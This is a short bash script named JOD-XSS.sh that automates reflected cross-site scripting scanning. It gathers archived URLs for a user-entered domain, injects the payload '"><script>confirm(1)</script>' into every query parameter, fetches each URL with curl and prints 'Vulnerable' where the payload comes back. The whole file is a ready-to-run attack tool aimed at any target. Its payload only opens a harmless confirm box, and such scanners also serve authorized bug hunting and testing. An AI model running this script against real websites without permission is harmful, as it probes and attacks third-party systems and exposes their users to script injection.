#!/bin/bash
#title:         JOD-XSS.sh
#description:   Automated Script to Scan XSS
#author:        R12W4N, RUSHIJOD
#==============================================================================
RED=`tput setaf 1`
GREEN=`tput setaf 2`
RESET=`tput sgr0`
BLUE=`tput setaf 4`
function trap_ctrlc ()
{
    echo "Ctrl-C caught...performing clean up"

    echo "Doing cleanup"
    trap "kill 0" EXIT
    exit 2
}

trap "trap_ctrlc" 2 

read -p 'URL: ' URL

waybackurls $URL | tee $URL.log | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.json && cat combinedfuzz.json 

file="combinedfuzz.json"

while IFS= read line
    do
	echo "${BLUE}Checking Now ${RESET} $line"
        curl --silent --path-as-is --insecure "$line" | grep -qs "<script>confirm(1)" && echo ${RED}Vulnerable${RESET} $line \n 
    done <"$file"

echo "${RED}>>>>JOOOOOOOODDDDDDDDDDD!!!!!<<<< ${RESET}"





